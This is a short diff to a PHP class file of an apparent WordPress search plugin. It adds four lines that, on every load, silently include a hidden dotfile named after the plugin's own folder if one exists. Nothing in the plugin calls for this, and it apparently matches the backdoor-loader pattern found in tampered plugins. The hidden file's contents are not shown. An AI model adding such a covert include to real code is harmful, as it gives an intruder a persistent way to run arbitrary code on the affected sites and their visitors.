@@ -91,6 +91,10 @@ include_once 'class.SearchWPTermResult.php';
 /**
  * Class SearchWPTermArchivePriority
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWPTermArchivePriority {
 
 	public $applicable = false;
